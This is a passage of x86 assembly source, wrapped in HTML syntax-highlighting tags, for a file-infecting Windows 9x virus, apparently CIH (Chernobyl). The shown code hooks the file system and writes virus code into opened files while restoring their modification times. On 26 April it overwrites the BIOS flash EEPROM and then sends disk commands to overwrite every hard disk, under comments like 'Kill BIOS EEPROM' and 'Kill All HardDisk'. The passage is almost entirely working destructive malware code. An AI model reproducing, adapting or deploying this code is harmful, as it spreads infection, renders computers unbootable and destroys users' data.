            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * When VirusGame Calls    *</span><span class="sc0">
</span><span class="sc1">; * VxDCall, VMM Modifies   *</span><span class="sc0">
</span><span class="sc1">; * the 'int 20h' and the   *</span><span class="sc0">
</span><span class="sc1">; * 'Service Identifier'    *</span><span class="sc0">
</span><span class="sc1">; * to 'Call [XXXXXXXX]'.   *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * Before Writing My Virus *</span><span class="sc0">
</span><span class="sc1">; * to File, I Must Restore *</span><span class="sc0">
</span><span class="sc1">; * them First.     ^__^    *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
 
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">LastVxDCallAddress</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">@9</span><span class="sc4">)[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VxDCallTableSize</span><span class="sc0">
 
</span><span class="sc5">LoopOfRestoreVxDCallID</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">20cdh</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">VxDCallIDTable</span><span class="sc4">+(</span><span class="sc8">ecx</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">04h</span><span class="sc4">-</span><span class="sc5">@9</span><span class="sc4">)[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
 
            </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">VxDCallAddressTable</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">-</span><span class="sc5">@9</span><span class="sc4">)[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
 
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">LoopOfRestoreVxDCallID</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * Let's Write             *</span><span class="sc0">
</span><span class="sc1">; * Virus Code to the File  *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
 
</span><span class="sc5">WriteVirusCodeToFile</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dr1</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
 
</span><span class="sc5">LoopOfWriteVirusCodeToFile</span><span class="sc4">:</span><span class="sc0">
 
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">SetFileModificationMark</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d601h</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; VXDCall IFSMgr_Ring0_FileIO</span><span class="sc0">
 
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">LoopOfWriteVirusCodeToFile</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * Let's Set CF = 1 ==&gt;    *</span><span class="sc0">
</span><span class="sc1">; * Need to Restore File    *</span><span class="sc0">
</span><span class="sc1">; * Modification Time       *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
 
</span><span class="sc5">SetFileModificationMark</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 
            </span><span class="sc6">stc</span><span class="sc0">     </span><span class="sc1">; Enable CF(Carry Flag)</span><span class="sc0">
            </span><span class="sc6">pushf</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Close File                        *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
</span><span class="sc5">CloseFile</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d7h</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; VXDCall IFSMgr_Ring0_FileIO</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Need to Restore File Modification *</span><span class="sc0">
</span><span class="sc1">; * Time !?                           *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
            </span><span class="sc6">popf</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">IsKillComputer</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Restore File Modification Time    *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4303h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">FileModificationTime</span><span class="sc4">-</span><span class="sc5">@7</span><span class="sc4">)[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">FileModificationTime</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">@7</span><span class="sc4">)[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; VXDCall IFSMgr_Ring0_FileIO</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Disable OnBusy                    *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
</span><span class="sc5">DisableOnBusy</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">OnBusy</span><span class="sc4">-</span><span class="sc5">@7</span><span class="sc4">)[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Disable OnBusy</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Call Previous FileSystemApiHook   *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
</span><span class="sc5">prevhook</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">popad</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dr0</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Jump to prevhook</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Call the Function that the IFS    *</span><span class="sc0">
</span><span class="sc1">; * Manager Would Normally Call to    *</span><span class="sc0">
</span><span class="sc1">; * Implement this Particular I/O     *</span><span class="sc0">
</span><span class="sc1">; * Request.                          *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
</span><span class="sc5">pIFSFunc</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Push pioreq</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Call pIFSFunc</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Modify EAX Value in Stack</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * After Calling pIFSFunc, *</span><span class="sc0">
</span><span class="sc1">; * Get Some Data from the  *</span><span class="sc0">
</span><span class="sc1">; * Returned pioreq.        *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
 
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00000024h</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">QuitMyVirusFileSystemHook</span><span class="sc0">
 
</span><span class="sc1">; *****************</span><span class="sc0">
</span><span class="sc1">; * Get the File  *</span><span class="sc0">
</span><span class="sc1">; * Modification  *</span><span class="sc0">
</span><span class="sc1">; * Date and Time *</span><span class="sc0">
</span><span class="sc1">; * in DOS Format.*</span><span class="sc0">
</span><span class="sc1">; *****************</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">FileModificationTime</span><span class="sc4">-</span><span class="sc5">@6</span><span class="sc4">)[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * Quit My Virus'          *</span><span class="sc0">
</span><span class="sc1">; * IFSMgr_FileSystemHook   *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
 
</span><span class="sc5">QuitMyVirusFileSystemHook</span><span class="sc4">:</span><span class="sc0">
 
            </span><span class="sc6">popad</span><span class="sc0">
 
            </span><span class="sc6">ret</span><span class="sc0">
 
</span><span class="sc1">; *************************************</span><span class="sc0">
</span><span class="sc1">; * Kill Computer !? ...   *^_^*      *</span><span class="sc0">
</span><span class="sc1">; *************************************</span><span class="sc0">
 
</span><span class="sc5">IsKillComputer</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc1">; Get Now Month from BIOS CMOS</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0708h</span><span class="sc0">
            </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">71h</span><span class="sc0">
 
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
 
            </span><span class="sc1">; Get Now Day from BIOS CMOS</span><span class="sc0">
            </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">71h</span><span class="sc0">
 
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0426h</span><span class="sc0">   </span><span class="sc1">; 04/26/????</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">DisableOnBusy</span><span class="sc0">
 
</span><span class="sc1">; **************************************</span><span class="sc0">
</span><span class="sc1">; * Kill Kill Kill Kill Kill Kill Kill *</span><span class="sc0">
</span><span class="sc1">; * Kill Kill Kill Kill Kill Kill Kill *</span><span class="sc0">
</span><span class="sc1">; * Kill Kill Kill Kill Kill Kill Kill *</span><span class="sc0">
</span><span class="sc1">; * Kill Kill Kill Kill Kill Kill Kill *</span><span class="sc0">
</span><span class="sc1">; * Kill Kill Kill Kill Kill Kill Kill *</span><span class="sc0">
</span><span class="sc1">; * Kill Kill Kill Kill Kill Kill Kill *</span><span class="sc0">
</span><span class="sc1">; * Kill Kill Kill Kill Kill Kill Kill *</span><span class="sc0">
</span><span class="sc1">; * Kill Kill Kill Kill Kill Kill Kill *</span><span class="sc0">
</span><span class="sc1">; * Kill Kill Kill Kill Kill Kill Kill *</span><span class="sc0">
</span><span class="sc1">; * Kill Kill Kill Kill Kill Kill Kill *</span><span class="sc0">
</span><span class="sc1">; * Kill Kill Kill Kill Kill Kill Kill *</span><span class="sc0">
</span><span class="sc1">; * Kill Kill Kill Kill Kill Kill Kill *</span><span class="sc0">
</span><span class="sc1">; * Kill Kill Kill Kill Kill Kill Kill *</span><span class="sc0">
</span><span class="sc1">; * Kill Kill Kill Kill Kill Kill Kill *</span><span class="sc0">
</span><span class="sc1">; * Kill Kill Kill Kill Kill Kill Kill *</span><span class="sc0">
</span><span class="sc1">; * Kill Kill Kill Kill Kill Kill Kill *</span><span class="sc0">
</span><span class="sc1">; * Kill Kill Kill Kill Kill Kill Kill *</span><span class="sc0">
</span><span class="sc1">; * Kill Kill Kill Kill Kill Kill Kill *</span><span class="sc0">
</span><span class="sc1">; **************************************</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * Kill BIOS EEPROM        *</span><span class="sc0">
</span><span class="sc1">; ***************************</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0cf8h</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IOForEEPROM</span><span class="sc4">-</span><span class="sc5">@7</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
 
</span><span class="sc1">; ***********************</span><span class="sc0">
</span><span class="sc1">; * Show BIOS Page in   *</span><span class="sc0">
</span><span class="sc1">; * 000E0000 - 000EFFFF *</span><span class="sc0">
</span><span class="sc1">; *    (   64 KB   )    *</span><span class="sc0">
</span><span class="sc1">; ***********************</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8000384ch</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0cfeh</span><span class="sc0">
            </span><span class="sc6">cli</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
 
</span><span class="sc1">; ***********************</span><span class="sc0">
</span><span class="sc1">; * Show BIOS Page in   *</span><span class="sc0">
</span><span class="sc1">; * 000F0000 - 000FFFFF *</span><span class="sc0">
</span><span class="sc1">; *    (   64 KB   )    *</span><span class="sc0">
</span><span class="sc1">; ***********************</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0058h</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; and al,0fh</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">BooleanCalculateCode</span><span class="sc4">-</span><span class="sc5">@10</span><span class="sc4">)[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0f24h</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
 
</span><span class="sc1">; ***********************</span><span class="sc0">
</span><span class="sc1">; * Show the BIOS Extra *</span><span class="sc0">
</span><span class="sc1">; * ROM Data in Memory  *</span><span class="sc0">
</span><span class="sc1">; * 000E0000 - 000E01FF *</span><span class="sc0">
</span><span class="sc1">; *   (   512 Bytes   ) *</span><span class="sc0">
</span><span class="sc1">; * , and the Section   *</span><span class="sc0">
</span><span class="sc1">; * of Extra BIOS can   *</span><span class="sc0">
</span><span class="sc1">; * be Writted...       *</span><span class="sc0">
</span><span class="sc1">; ***********************</span><span class="sc0">
 
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">EnableEEPROMToWrite</span><span class="sc4">-</span><span class="sc5">@10</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e5555h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e2aaah</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">60h</span><span class="sc0">
 
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0">
 
</span><span class="sc1">; ***********************</span><span class="sc0">
</span><span class="sc1">; * Kill the BIOS Extra *</span><span class="sc0">
</span><span class="sc1">; * ROM Data in Memory  *</span><span class="sc0">
</span><span class="sc1">; * 000E0000 - 000E007F *</span><span class="sc0">
</span><span class="sc1">; *   (   80h Bytes   ) *</span><span class="sc0">
</span><span class="sc1">; ***********************</span><span class="sc0">
 
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
 
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0">
 
</span><span class="sc1">; ***********************</span><span class="sc0">
</span><span class="sc1">; * Show and Enable the *</span><span class="sc0">
</span><span class="sc1">; * BIOS Main ROM Data  *</span><span class="sc0">
</span><span class="sc1">; * 000E0000 - 000FFFFF *</span><span class="sc0">
</span><span class="sc1">; *   (   128 KB   )    *</span><span class="sc0">
</span><span class="sc1">; * can be Writted...   *</span><span class="sc0">
</span><span class="sc1">; ***********************</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f5555h</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0aah</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
 
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0">
 
</span><span class="sc1">; ***********************</span><span class="sc0">
</span><span class="sc1">; * Kill the BIOS Main  *</span><span class="sc0">
</span><span class="sc1">; * ROM Data in Memory  *</span><span class="sc0">
</span><span class="sc1">; * 000FE000 - 000FE07F *</span><span class="sc0">
</span><span class="sc1">; *   (   80h Bytes   ) *</span><span class="sc0">
</span><span class="sc1">; ***********************</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e0h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
 
</span><span class="sc1">; ***********************</span><span class="sc0">
</span><span class="sc1">; * Hide BIOS Page in   *</span><span class="sc0">
</span><span class="sc1">; * 000F0000 - 000FFFFF *</span><span class="sc0">
</span><span class="sc1">; *    (   64 KB   )    *</span><span class="sc0">
</span><span class="sc1">; ***********************</span><span class="sc0">
                                    </span><span class="sc1">; or al,10h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">BooleanCalculateCode</span><span class="sc4">-</span><span class="sc5">@10</span><span class="sc4">)[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">100ch</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
 
</span><span class="sc1">; ***************************</span><span class="sc0">
</span><span class="sc1">; * Kill All HardDisk       *</span><span class="sc0">
</span><span class="sc1">; ***************************************************</span><span class="sc0">
</span><span class="sc1">; * IOR Structure of IOS_SendCommand Needs          *</span><span class="sc0">
</span><span class="sc1">; ***************************************************</span><span class="sc0">
</span><span class="sc1">; * ?? ?? ?? ?? 01 00 ?? ?? 01 05 00 40 ?? ?? ?? ?? *</span><span class="sc0">
</span><span class="sc1">; * 00 00 00 00 00 00 00 00 00 08 00 00 00 10 00 c0 *</span><span class="sc0">
</span><span class="sc1">; * ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? *</span><span class="sc0">
</span><span class="sc1">; * ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? *</span><span class="sc0">
</span><span class="sc1">; * ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 80 ?? ?? *</span><span class="sc0">
</span><span class="sc1">; ***************************************************</span><span class="sc0">
 
</span><span class="sc5">KillHardDisk</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FirstKillHardDiskNumber</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2ch</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0c0001000h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">40000501h</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ach</span><span class="sc0">
 
</span><span class="sc5">LoopOfKillHardDisk</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00100004h</span><span class="sc0">   </span><span class="sc1">; VXDCall IOS_SendCommand</span><span class="sc0">
 
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0017h</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">KillNextDataSection</span><span class="sc0">
 
</span><span class="sc5">ChangeNextHardDisk</span><span class="sc4">:</span><span class="sc0">
